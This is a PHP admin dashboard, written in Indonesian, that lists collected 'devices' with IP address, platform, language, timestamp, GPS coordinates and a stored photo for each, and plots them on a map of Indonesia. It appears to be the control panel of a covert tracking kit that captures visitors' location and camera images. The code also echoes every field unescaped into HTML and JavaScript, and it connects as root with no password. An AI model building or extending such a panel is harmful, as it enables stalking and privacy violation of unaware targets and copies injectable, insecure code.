<?php
session_start();

if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    exit;
}

// koneksi database
$conn = new mysqli("localhost", "root", "", "global");

if ($conn->connect_error) {
    die("Koneksi gagal");
}

// ambil data
$data = $conn->query("SELECT * FROM perangkat ORDER BY id DESC");
$total = $conn->query("SELECT COUNT(*) as jumlah FROM perangkat")->fetch_assoc()['jumlah'];
?>

<!DOCTYPE html>
<html>
<head>

<title>GLOBAL ADMIN</title>

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>

<style>

body {
    margin:0;
    font-family: Arial;
    background:#0f172a;
    color:white;
}

header {
    background:#020617;
    padding:15px;
    display:flex;
    justify-content:space-between;
    align-items:center;
}

.container {
    padding:20px;
}

.card {
    background:#1e293b;
    padding:20px;
    border-radius:10px;
    margin-bottom:20px;
}

table {
    width:100%;
    border-collapse:collapse;
}

th {
    background:#020617;
    padding:10px;
}

td {
    padding:10px;
    border-bottom:1px solid #334155;
}

img {
    width:80px;
    border-radius:5px;
}

button {
    padding:6px 12px;
    border:none;
    border-radius:5px;
    cursor:pointer;
}

.hapus {
    background:red;
    color:white;
}

.logout {
    background:orange;
}

.hapus-semua {
    background:crimson;
    color:white;
}

#map {
    height:400px;
    border-radius:10px;
}

</style>

</head>
<body>

<header>

<h2>GLOBAL ADMIN</h2>

<div>

<a href="hapus_semua.php">
<button class="hapus-semua">Hapus Semua</button>
</a>

<a href="logout.php">
<button class="logout">Logout</button>
</a>

</div>

</header>


<div class="container">

<!-- TOTAL -->
<div class="card">

<h3>Total Perangkat</h3>
<h1><?php echo $total; ?></h1>

</div>


<!-- MAP -->
<div class="card">

<h3>Peta Lokasi Perangkat</h3>

<div id="map"></div>

</div>


<!-- TABEL -->
<div class="card">

<h3>Data Perangkat</h3>

<table>

<tr>
<th>ID</th>
<th>IP</th>
<th>Device</th>
<th>Platform</th>
<th>Bahasa</th>
<th>Waktu</th>
<th>Lokasi</th>
<th>Foto</th>
<th>Aksi</th>
</tr>

<?php while($row = $data->fetch_assoc()) { ?>

<tr>

<td><?php echo $row['id']; ?></td>

<td><?php echo $row['ip']; ?></td>

<td><?php echo $row['device']; ?></td>

<td><?php echo $row['platform']; ?></td>

<td><?php echo $row['bahasa']; ?></td>

<td><?php echo $row['waktu_server']; ?></td>

<td>

<?php echo $row['latitude']; ?> ,
<?php echo $row['longitude']; ?>

<br>

<a target="_blank"
href="https://www.google.com/maps?q=<?php echo $row['latitude']; ?>,<?php echo $row['longitude']; ?>">
Lihat Map
</a>

</td>

<td>

<?php if($row['foto']!=""){ ?>

<img src="foto/<?php echo $row['foto']; ?>">

<?php } ?>

</td>

<td>

<a href="hapus.php?id=<?php echo $row['id']; ?>">
<button class="hapus">Hapus</button>
</a>

</td>

</tr>

<?php } ?>

</table>

</div>

</div>


<!-- MAP SCRIPT -->
<script>

var map = L.map('map').setView([-2.5,118],5);

L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
    attribution:'Map'
}).addTo(map);

<?php

$dataMap = $conn->query("SELECT * FROM perangkat");

while($m = $dataMap->fetch_assoc()){

    if($m['latitude'] != "-" && $m['longitude'] != "-"){

        echo "
        L.marker([".$m['latitude'].", ".$m['longitude']."])
        .addTo(map)
        .bindPopup(
        'IP: ".$m['ip']."<br>
         Device: ".$m['platform']."<br>
         Waktu: ".$m['waktu_server']."'
        );
        ";

    }

}
?>

</script>

</body>
</html>
